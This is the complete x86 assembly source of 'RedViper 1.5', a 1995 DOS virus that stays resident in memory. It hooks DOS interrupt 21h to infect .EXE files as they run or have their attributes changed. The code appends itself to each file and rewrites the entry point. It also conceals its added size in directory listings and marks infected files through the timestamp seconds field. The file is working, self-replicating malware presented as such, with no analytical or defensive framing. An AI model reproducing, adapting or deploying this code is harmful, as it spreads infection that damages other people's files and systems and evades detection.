;*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*
;
;                           RedViper 1.5
;                               by
;                         T o r N a d o / DC
;                               
;        -- Parasitic resident .EXE infector
;        -- Filesize stealth ( 11h / 12h )
;        -- Int24 ( Critical Error Handler )
;        -- Time based infection marker ( second field = 29 )
;        -- Saves original Time / Date
;        -- Dont infect windows .EXE files 
;
;*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#**#*#*#*#*#*#*#*#*#*#*#*#*#*#**#*#*#*#*#**#*#*#*
   
redviper        segment 
                  assume  cs:redviper,ds:redviper,es:redviper
                  org     00h

start:          call    delta

delta:          pop     bp
                  sub     bp,offset delta

                  push    ds
                  push    es

installation:   mov     ax,7411h
                  int     21h

                  cmp     bx,'RV'                     ; RV returned in bx?
                  je      error_resident              ; = assume resident

cut_memory:     mov     ah,4ah                      ; find top of memory
                  mov     bx,0ffffh                   ; (65536)
                  int     21h                          

                  sub     bx,(codeend-start+15)/16+1  ; resize enough para's
                  mov     ah,4ah                      ; for virus
                  int     21h

                  mov     ah,48h                      ; allocate for virus
                  mov     bx,(codeend-start+15)/16
                  int     21h
                  jc      error_resident

                  dec     ax                          ; ax - 1 = mcb
                  mov     es,ax
                  mov     byte ptr es:[0],'Z'
                  mov     word ptr es:[1],8           ; dos = mcb owner
                  inc     ax

                  push    cs
                  pop     ds

                  mov     es,ax
                  xor     di,di
                  mov     cx,(codeend-start+4)/2      ; vir len
                  mov     si,bp
                  rep     movsw

hook_int21h:    xor     ax,ax
                  mov     ds,ax
                  push    ds                            
                                                       
                  lds     ax,ds:[21h*4]                                         
   
                  mov     word ptr es:[oldint21h],ax  
                  mov     word ptr es:[oldint21h+2],ds
                  pop     ds
                  mov     word ptr ds:[21h*4],offset virusint21
                  mov     ds:[21h*4+2],es

error_resident: pop     es
                  pop     ds

restore_EXE:    mov     ax,es
                  add     ax,10h
                  add     word ptr cs:[bp+csip+02h],ax
                  cli
                  mov     sp,word ptr cs:[bp+spss]
                  add     ax,word ptr cs:[bp+spss+02h]
                  mov     ss,ax
                  sti
                  mov     ax,bx
                  db      0eah
csip            dd      0fff00000h
spss            dd      ?

virusint21      proc    near

                  cmp     ax,4b00h          ; Execute
                  je      infect

                  cmp     ax,4301h          ; Set attributes
                  je      infect

                  cmp     ah,11h            ; FCB findfirst
                  je      FCB_stealth

                  cmp     ah,12h            ; FCB findnext 
                  je      FCB_stealth

                  cmp     ax,7411h          ; Check if resident
                  jne     function21
                  mov     bx,'RV'
                  iret
                  endp

function21:     jmp     dword ptr cs:oldint21h
                  ret

FCB_stealth:    pushf
                  push    cs
                  call    function21
                  or      al,al               ; was the dir call sucessfull??
                  jnz     skip_dir            ; if not skip it

                  push    ax bx es            

                  mov     ah,62h              ; get current PSP to es:bx
                  int     21h                 ; can use both 51h/62h
                  mov     es,bx
                  cmp     bx,es:[16h]         ; is the PSP ok??
                  jnz     error_out

                  mov     bx,dx
                  mov     al,[bx]                    
                  push    ax                         
                  mov     ah,2fh                     
                  int     21h
                  pop     ax
                  inc     al                          
                  jnz     no_ext
                  add     bx,7                        

no_ext:         mov     al,byte ptr es:[bx+17h]     ;get seconds field
                  and     al,1fh
                  xor     al,1dh                      ;is the file infected??
                  jnz     error_out                   ;if not don't hide size

                  cmp     word ptr es:[bx+1dh],(codeend-start) ;< than vir_size
                  ja      hide_it

                  cmp     word ptr es:[bx+1fh],0      ; it can't be infected
                  je      error_out

hide_it:        sub     word ptr es:[bx+1dh],(codeend-start) ; sub vir_size
                  sbb     word ptr es:[bx+1fh],0
error_out:      pop     es bx ax      
skip_dir:       retf    2                   

virusint24      proc    near
                  mov     al,03h
                  iret           
                  endp

infect:         push    es bp ax bx cx si di ds dx

                  push    ds
                  push    dx
                  mov     ax,3524h
                  int     21h
                  mov     word ptr cs:[save_int24],bx
                  mov     word ptr cs:[save_int24+2],es

                  push    cs
                  pop     ds
                  mov     dx,offset virusint24
                  mov     ax,2524h
                  int     21h

                  pop     dx
                  pop     ds 

                  mov     ax,3d02h                ;open file
                  int     21h
                  xchg    ax,bx

                  push    cs
                  push    cs
                  pop     ds
                  pop     es

                  mov     ax,5700h           ;save and check time/date stamp
                  int     21h
                  push    dx
                  push    cx
                  and     cl,1fh
                  xor     cl,1dh           ; secs = 29 !!!
                  jne     read_bytes
                  jmp     close

read_bytes:     mov     ah,3fh            ;read 26 bytes to header
                  mov     cx,1ah
                  mov     dx,offset header 
                  int     21h

                  cmp     byte ptr header[24],'@' ; windows .EXE file ?
                  je      close

                  cmp     byte ptr header,'M'     ; normal .EXE file ?
                  je      exe_file

                  jmp     close                   ; if not jump out

exe_file:       mov     ax,4202h           ;goto end of file
                  call    file_pointer

                  push    ax                  
                  push    es
                  pop     es

                  mov     di,offset csip       
                  mov     si,offset header+14h
                  mov     cx,2
                  rep     movsw
                  mov     si,offset header
                  mov     cx,2
                  rep     movsw

                  pop     ax                          ;restore ax and
                  mov     cx,10h
                  div     cx
                  sub     ax,word ptr [header+8h]
                  mov     word ptr [header+14h],dx       ;calculate CS:IP
                  mov     word ptr [header+16h],ax
                  add     ax,00h 
                  mov     word ptr [header+0eh],ax       ;SS:SP
                  mov     word ptr [header+10h],00h

write_virus:    mov     ah,40h                      ;write it to file
                  mov     cx,(codeend-start)
                  mov     dx,offset start
                  int     21h

                  push    cs
                  pop     ds

                  mov     ax,4202h                    ;go to end of file
                  call    file_pointer

                  mov     cx,512 ;recalculate new file length in 512-byte pages
                  div     cx                 
                  inc     ax
                  mov     word ptr [header+2],dx
                  mov     word ptr [header+4],ax

goto_start:     mov     ax,4200h       ;go to beginning of file
                  call    file_pointer

                  mov     cx,1ah         ;write 26 bytes to file
                  mov     dx,offset header
                  mov     ah,40h
                  int     21h

close:          mov     ax,5701h       ;restore time/date and mark infected
                  pop     cx
                  pop     dx
                  or      cl,00011101b
                  and     cl,11111101b  ; secs = 29
                  int     21h

                  mov     ah,3eh
                  int     21h     

                  push    ds
                  pop     ds
                  mov     ds,cs:[save_int24+2]
                  mov     dx,cs:[save_int24]
                  mov     ax,2524h
                  int     21h                     ; restore the int 24h

                  pop     dx ds di si cx bx ax bp es
                  jmp     function21

file_pointer:   xor     cx,cx
                  cwd
                  int     21h
                  ret

logo            db "[ RedViper 1.5 (c) made by TorNado/[DC] in Denmark '95 ]"

oldint21h       dd      ?
header          db      1ah dup(?)      ; store 26 bytes from file
save_int24      dw      2 dup (?)

codeend:

redviper        ends
end             start
